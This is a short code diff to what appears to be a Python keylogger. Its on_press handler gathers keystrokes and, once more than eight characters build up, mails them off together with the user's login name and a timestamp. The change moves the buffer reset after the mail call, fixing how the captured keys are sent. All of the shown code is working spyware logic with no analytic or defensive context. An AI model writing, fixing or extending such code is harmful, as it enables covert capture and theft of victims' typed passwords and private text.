@@ -13,8 +13,9 @@ def on_press(key):
     if (len(v)>8):
         v=v+str(key)
         b="The report from PC:-{} at time:-{} data is:-{}".format(os.getlogin(),str(time.ctime(time.time())),v)
-        v=""
         mail(b)
+        v=""
+        
     else:
         v=v+str(key)
       
